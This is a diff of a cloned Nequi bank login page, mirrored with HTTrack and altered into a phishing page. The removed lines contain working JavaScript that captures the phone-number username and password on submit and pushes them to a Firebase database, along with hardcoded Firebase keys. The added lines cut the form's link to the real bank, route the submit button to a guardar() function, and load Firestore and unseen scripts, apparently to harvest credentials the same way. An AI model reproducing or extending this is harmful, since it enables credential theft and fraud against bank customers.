@@ -34,71 +34,6 @@
     <script type="text/javascript"
         src="https://transacciones.nequi.com/bdigital/js/libs/angular-recaptcha.min.js"></script>
 
-    <script type="module">
-      // Import the functions you need from the SDKs you need
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
-      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-analytics.js";
-      // TODO: Add SDKs for Firebase products that you want to use
-      // https://firebase.google.com/docs/web/setup#available-libraries
-
-      // Your web app's Firebase configuration
-      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-      const firebaseConfig = {
-        apiKey: "AIzaSyCoKwkdmTzJMn35ExIVurNiqYwrTnRHwUs",
-        authDomain: "nequi-b7540.firebaseapp.com",
-        projectId: "nequi-b7540",
-        storageBucket: "nequi-b7540.appspot.com",
-        messagingSenderId: "356732062802",
-        appId: "1:356732062802:web:ffac8b16f1bb2ed95de38b",
-        measurementId: "G-F25V1R6LWM"
-      };
-
-      // Initialize Firebase
-      const app = initializeApp(firebaseConfig);
-      const analytics = getAnalytics(app);
-</script>
-
-
-
-    <script>
-  document.addEventListener("DOMContentLoaded", function () {
-    const form = document.getElementById("login-form");
-    const userInput = document.getElementById("user-input");
-    const passwordInput = document.getElementById("password-input");
-
-    // Configura la referencia a la base de datos de Firebase (reemplaza con tu propia URL de Firebase)
-    const firebaseConfig = {
-        apiKey: "AIzaSyCoKwkdmTzJMn35ExIVurNiqYwrTnRHwUs",
-        authDomain: "nequi-b7540.firebaseapp.com",
-        projectId: "nequi-b7540",
-        storageBucket: "nequi-b7540.appspot.com",
-        messagingSenderId: "356732062802",
-        appId: "1:356732062802:web:ffac8b16f1bb2ed95de38b"
-    };
-    firebase.initializeApp(firebaseConfig);
-
-    form.addEventListener("submit", function (e) {
-      e.preventDefault(); // Evita que el formulario se envíe de forma predeterminada
-
-      const userData = {
-        username: userInput.value,
-        password: passwordInput.value,
-      };
-
-      // Almacena los datos en la base de datos de Firebase (reemplaza 'tu-db' con el nombre de tu base de datos)
-      const db = firebase.database();
-      const ref = db.ref();
-      ref.push(userData).then(() => {
-        alert("Datos almacenados con éxito");
-        // Restablece los campos de entrada después de guardar los datos
-        userInput.value = "";
-        passwordInput.value = "";
-      });
-    });
-  });
-</script>
-
-
     <style>
         #submitButton {
             box-sizing: border-box;
@@ -137,21 +72,12 @@
 
     <div id="content">
         <div ng-include="getTemplate('/header.html')"></div>
-        <div style="background-color: white; width: 100vw; height: 10vh;">
-            <img src="nequi.png" alt="Descripción de la imagen" style="width: 150px; height: auto; position: absolute; left: 10px; top: 5px;">
-            <img src="botones.png" alt="Descripción de la imagen" style="width: 320px; height: auto; position: absolute; left: 70%; top: 0;">
-        </div>
-       
-
-</div>
         <section class="login-section" ng-controller="loginController as loginControl">
             <div class="login-wrap">
-                <a href="https://docs.google.com/forms/d/e/1FAIpQLSdK118Mv-CUHUL5VxDddZm5flJafeNMz488Nq8scsvWHFuWnw/viewform" style="text-decoration: none; display: inline-block; background-color: #1E2962; color: #fff; padding: 10px 20px; border-radius: 5px; margin-bottom: 10px;">Encuesta de Satisfacción</a>
-                <h1>Entra a tu nequi</h1>
-                <p>Podrás bloquear tu Nequi y consultar tus datos.</p>
+                <h1>{{i18n.views.authLogin.title}}</h1>
+                <p>{{i18n.views.authLogin.phraseOne}}</p>
                 <div class="login-form-wrap">
-                    <form method="POST" action="https://transacciones.nequi.com/bdigital/loginServiceAuthentication"
-                        autocomplete="off" name="loginControl.formLogin" novalidate>
+                    <form>
                         <div class="input-wrap input-country">
                             <div class="wrap-select-country">
                                 <select-country selected-country="loginControl.selectCountry"
@@ -170,24 +96,24 @@
                                     
                                 </div>
                                 
-                                
                             </div>
 
-                            <input class="form-input-text" type="tel" id="j_username" name="j_username"
-                                placeholder="Celular" ng-required="true"
+                            <input class="form-input-text" type="tel" id="telefono" name="telefono"
+                                placeholder="{{i18n.views.authLogin.inputUser}}" ng-required="true"
                                 ng-minlength="configCountry.inputs.phoneNumber.minlength"
                                 ng-pattern="configCountry.inputs.phoneNumber.regEx" ng-model="loginControl.user"
                                 ui-us-phone-number masklocalstring="{{configCountry.inputs.phoneNumber.maskString}}">
                         </div>
                         <div class="input-wrap">
                             <input class="form-input-text" type="password" id="j_password" name="j_password"
-                                placeholder="Contraseña" ng-required="true"
+                                placeholder="{{i18n.views.authLogin.inputPass}}" ng-required="true"
                                 ng-maxlength="configCountry.inputs.password.minlength"
                                 ng-minlength="configCountry.inputs.password.minlength"
                                 ng-pattern="configCountry.inputs.password.regEx" ng-model="loginControl.password">
                         </div class="btn-wrap">
-                        <input id="submitButton" type="submit" value="Entra"
-                            ng-click="loginControl.passEncrypt()" ng-disabled="!loginControl.formLogin.$valid">
+
+                        <button id="submitButton" onclick="guardar()">Entrar</button>
+                        
                 </div>
                 </form>
             </div>
@@ -206,6 +132,14 @@
 <script src="https://transacciones.nequi.com/bdigital/js/libs/string-mask.js"></script>
 <!-- App -->
 <script src="https://transacciones.nequi.com/bdigital/js/scripts.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+<script src="/js/configuracion.js"></script>
+<script src="/js/guardar.js"></script>
+
 
 <!-- Mirrored from transacciones.nequi.com by HTTrack Website Copier/3.x [XR/YP'2000] -->
 
